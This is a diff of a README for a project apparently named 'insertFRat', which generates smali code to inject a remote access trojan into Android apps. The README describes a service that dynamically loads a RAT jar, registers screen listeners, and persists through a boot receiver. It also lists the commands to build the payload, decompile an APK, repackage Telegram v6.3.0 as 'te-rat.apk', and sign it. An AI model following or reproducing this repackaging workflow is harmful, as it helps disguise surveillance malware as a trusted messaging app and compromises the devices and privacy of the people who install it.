@@ -1,4 +1,4 @@
-### insertFRat
+# insertFRat
 
 此项目用于生成部分需要添加的smali代码，如myService中动态加载包含RAT逻辑的jar并执行，注册屏幕监听事件。
 
@@ -17,6 +17,8 @@ apktool d app-debug.apk
 - BootReceiver.smali：开机或重启完成监听。
 
 ### add
+-gradlew makeJar
+-dx --dex --output ratdex.jar  rat.jar
 -java -jar apktool_2.4.1.jar d app-debug.apk
 -java -jar apktool_2.4.1.jar b .\Telegram_v6.3.0_apkpure.com -o te-rat.apk
 -jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keypass 123456 -storepass 123456 -keystore demo.keystore te-rat.apk demo.keystore
